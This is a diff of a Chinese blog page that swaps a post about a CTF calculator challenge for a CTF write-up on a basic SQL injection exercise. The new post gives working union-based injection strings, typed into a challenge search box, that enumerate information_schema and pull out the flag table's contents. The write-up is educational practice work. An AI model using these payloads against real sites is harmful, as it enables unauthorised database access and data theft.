@@ -15,20 +15,25 @@
 
 
 
-<meta name="description" content="Calculator题目描述">
+<meta name="description" content="Basic SQL知识准备大致浏览了SQL注入的知识，大致题型以及解题步骤，附上博客地址，供参考。">
+<meta name="keywords" content="web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web calculator">
-<meta property="og:url" content="https://hanqd.github.io/2019/03/26/Web calculate/index.html">
+<meta property="og:title" content="web oj:Basic SQL">
+<meta property="og:url" content="https://hanqd.github.io/2019/04/13/Sql/index.html">
 <meta property="og:site_name" content="HANqd&#39;s BLOG">
-<meta property="og:description" content="Calculator题目描述">
+<meta property="og:description" content="Basic SQL知识准备大致浏览了SQL注入的知识，大致题型以及解题步骤，附上博客地址，供参考。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/5.PNG">
-<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/6.PNG">
-<meta property="og:updated_time" content="2019-03-26T12:45:33.555Z">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/56.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/57.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/58.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/59.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/60.PNG">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/61.PNG">
+<meta property="og:updated_time" content="2019-04-13T08:34:03.500Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Web calculator">
-<meta name="twitter:description" content="Calculator题目描述">
-<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/5.PNG">
+<meta name="twitter:title" content="web oj:Basic SQL">
+<meta name="twitter:description" content="Basic SQL知识准备大致浏览了SQL注入的知识，大致题型以及解题步骤，附上博客地址，供参考。">
+<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/56.PNG">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -60,7 +65,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Web calculator | HANqd&#39;s BLOG</title>
+<title>web oj:Basic SQL | HANqd&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -270,11 +275,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-Web calculate" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Sql" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/26/Web calculate/" class="article-date">
-      <time datetime="2019-03-26T12:39:08.259Z" itemprop="datePublished">2019-03-26</time>
+      <a href="/2019/04/13/Sql/" class="article-date">
+      <time datetime="2019-04-13T08:32:55.543Z" itemprop="datePublished">2019-04-13</time>
 </a>
 
 
@@ -289,7 +294,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Web calculator
+      web oj:Basic SQL
     </h1>
   
 
@@ -299,6 +304,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -306,29 +315,21 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><a id="more"></a>
-<p><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/5.PNG" alt><br>打开链接，网页如下<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/6.PNG" alt></p>
-<h3 id="做题准备"><a href="#做题准备" class="headerlink" title="做题准备"></a>做题准备</h3><ol>
-<li>安装requests库<br>网址：<a href="http://cn.python-requests.org/zh_CN/latest/user/install.html#install" target="_blank" rel="noopener">http://cn.pythonrequests.org/zh_CN/latest/user/install.html#install</a><br>我是Windows系统，选择安装的压缩包，解压缩后，把整个文件夹复制到Python的Lib目录下即可。</li>
-<li>requests库的使用 <a href="http://cn.python-requests.org/zh_CN/latest/user/quickstart.html#url" target="_blank" rel="noopener">http://cn.python-requests.org/zh_CN/latest/user/quickstart.html#url</a></li>
-</ol>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>要用1.5s计算出结果，并且每次刷新calculator，算数表达式都会变，那么按照平常的计算方式肯定是行不通的，根据题目提示，可以用requests库来解决，要解决的问题：</p>
+        <h2 id="Basic-SQL"><a href="#Basic-SQL" class="headerlink" title="Basic SQL"></a>Basic SQL</h2><h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><p>大致浏览了SQL注入的知识，大致题型以及解题步骤，附上博客地址，供参考。<br><a id="more"></a></p>
 <ol>
-<li>怎样从服务器那获得算术表达式，计算出结果？</li>
-<li>怎样把计算出的结果提交给服务器？</li>
-<li>让服务器知道获取算式和提交结果的是一个人？</li>
+<li>了解SQL注入的理论知识 <a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/sqli/</a>  +<br><a href="https://www.jb51.net/article/93434.htm" target="_blank" rel="noopener">https://www.jb51.net/article/93434.htm</a></li>
+<li>基本注入步骤（我觉得易理解的） <a href="https://cloud.tencent.com/developer/news/155446" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/155446</a><br>step1：寻找注入点<br>step2：判断列数<br>step3：报显位<br>step4：联合查询数据库名、表名、字段名以及你需要的信息</li>
+<li>Sql常见题型整理 <a href="https://blog.csdn.net/huanghelouzi/article/details/82999684" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82999684</a></li>
+<li>手工注入示例：<a href="https://www.jb51.net/article/93442.htm" target="_blank" rel="noopener">https://www.jb51.net/article/93442.htm</a><br>（本题用这种方法）</li>
 </ol>
-<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><ul>
-<li><p>问题1：需要爬取网页信息，用正则表达式。（导入re模块）<br>Python通过re模块提供对正则表达式的支持。使用re的一般步骤是先将正则表达式的字符串形式编译为Pattern实例，然后使用Pattern实例处理文本并获得匹配结果（一个Match实例），最后使用Match实例获得信息，进行其他的操作。</p>
-</li>
-<li><p>问题2：requests里的get<br>传递 URL 参数<br>你也许经常想为 URL 的查询字符串(query string)传递某种数据。如果是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。例如， httpbin.org/get?key=val。 Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么可以使用如下代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>问题3：使用session会话<br>session是一次浏览器和服务器的会话对象，session也是缓存，是内容，是块数据。<br>因为我们访问网页使用的HTTP协议是无状态的，没有任何关系，快速的。所以我们如果想要关联客户的信息就需要一种办法能够把客户的信息联系在一起，这个方法就是cookie。但是cookie是把信息储存在用户本地，它在一个域名下是全局的。不安全又很容易的被修改。所以<strong>session就出现了，它储存在服务器上，通过它关联同一个用户的信息，这样用户在访问不同的页面的时候我们就知道对方是同一个人，而不需要每次无状态的访问都需要用户登录/关联了。</strong></p>
-</li>
-</ul>
-<h3 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = requests.Session()</span><br><span class="line">t = s.get(<span class="string">'http://123.207.149.64:23331/calculator/'</span>)</span><br><span class="line">print(t.text)</span><br><span class="line">value = re.compile(<span class="string">r'&lt;form action="" method="GET"&gt;&lt;span id="exp"&gt;(.*?)&lt;/span&gt;'</span>)</span><br><span class="line">n = re.findall(value, t.text, re.S | re.M)</span><br><span class="line">print(<span class="string">'result:\n\n%s=%d\n'</span> % (n, eval(n)))</span><br><span class="line">ans = eval(n)</span><br><span class="line">f = t.get(<span class="string">'http://123.207.149.64:23331/calculator/'</span>, params=&#123;<span class="string">'answer'</span>: ans&#125;)</span><br><span class="line">print(f.text)</span><br></pre></td></tr></table></figure>
-<p>结果运行时出现错误：AttributeError: module ‘requests’ has no attribute ‘session’，查了安装的requests库，里边有session模块，但就是运行说没有！！查了好多原因，也重装了requests，还是不行，做这个题用了太长时间了，今天脑子被他弄得晕晕的，决定明天在弄。</p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/56.PNG" alt><br>打开题目地址，界面如上，有一个搜索输入框，下边是News内容。根据题目是一个SQL注入题。</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol>
+<li>找注入点<br>在输入框中输入’，回车，页面出错，说明此处的单引号确实被服务器解析了。再加一个’，<br>输入’’，没出错，说明此处的单引号被我们成功闭合了。可以说明此处存在着sql注入点。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/57.PNG" alt></li>
+<li>判断列数<br>用到order by，即排序。order by 1，就是按第一个字段排序。一开始我们会猜一个大概的数字，比如order by 5。如果报错说明不能按第5个字段进行排序，也就是说没有第5个字段。之后我们折半来猜，所以第二次猜3。order by 3 有回显说明有第三列。再试4，发现4报错。于是可以确认该表只有3个字段。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/58.PNG" alt></li>
+<li>爆显位<br>判断页面中显示的字段<br>输入 <code>-1&#39; union select 1,2,3 #</code><br>结果是2和3字段可以显示我们在输入的内容<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/59.PNG" alt></li>
+<li>联合查询数据库名、表名、字段名以及所需要的信息<br>（1）查询数据库名（输入固定）<br>输入<code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata #</code><br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/60.PNG" alt><br>有两个数据库，在第二个字段中显示的。<br>（2）表名<br>输入<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>有f1agfl4gher3,news两个表，这里不截图了。<br>（3）表中的字段名（列）<br><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39; #</code><br>输入<code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;f1agfl4gher3&#39; #</code><br>f1agfl4gher3表有id,h3r31sfl4g两个字段<br><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;news&#39;#</code><br>news有id,title,content三个字段<br>（4）查看字段信息<br><code>1&#39; union select 1,字段名 from 表名 #</code><br>看到f1agfl4gher3表很像有flag的样子，于是输入<br><code>1&#39; union select 1,id,h3r31sfl4g from f1agfl4gher3 #</code><br>得到flag！</li>
+</ol>
+<p><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/61.PNG" alt></p>
 
       
     </div>
@@ -337,13 +338,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/26/Web calculate/">Web calculator</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/13/Sql/">web oj:Basic SQL</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
-        <p><span>发布时间:</span>2019-03-26, 20:39:08</p>
-        <p><span>最后更新:</span>2019-03-26, 20:45:33</p>
+        <p><span>发布时间:</span>2019-04-13, 16:32:55</p>
+        <p><span>最后更新:</span>2019-04-13, 16:34:03</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/26/Web calculate/" title="Web calculator">https://hanqd.github.io/2019/03/26/Web calculate/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/03/26/Web calculate/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/13/Sql/" title="web oj:Basic SQL">https://hanqd.github.io/2019/04/13/Sql/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/13/Sql/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -355,16 +356,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/27/每日一题1004/">
-                    每日一题 1004
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/26/每日一题1003/">
-                    每日一题 1003
+                <a href="/2019/04/12/oj Web/">
+                    Web calculator+Rapid Typing
                 </a>
             </div>
         
@@ -376,7 +371,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Calculator"><span class="toc-number">1.</span> <span class="toc-text">Calculator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#做题准备"><span class="toc-number">1.2.</span> <span class="toc-text">做题准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.3.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题步骤"><span class="toc-number">1.4.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本代码"><span class="toc-number">1.5.</span> <span class="toc-text">脚本代码</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-SQL"><span class="toc-number">1.</span> <span class="toc-text">Basic SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#知识准备"><span class="toc-number">1.1.</span> <span class="toc-text">知识准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.2.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.3.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -412,7 +407,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Web calculator　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"web oj:Basic SQL　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -428,7 +423,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box"></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2019/03/26/Web calculate/" data-title="Web calculator" data-url="https://hanqd.github.io/2019/03/26/Web calculate/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/04/13/Sql/" data-title="web oj:Basic SQL" data-url="https://hanqd.github.io/2019/04/13/Sql/"></div>
     <script>
         var duoshuoQuery = {short_name:""};
         var loadComment = function(){
@@ -451,15 +446,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/27/每日一题1004/" title="上一篇: 每日一题 1004">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/26/每日一题1003/" title="下一篇: 每日一题 1003">
+            <a href="/2019/04/12/oj Web/" title="下一篇: Web calculator+Rapid Typing">
                 <i class="fa fa-angle-right"></i>
             </a>
         
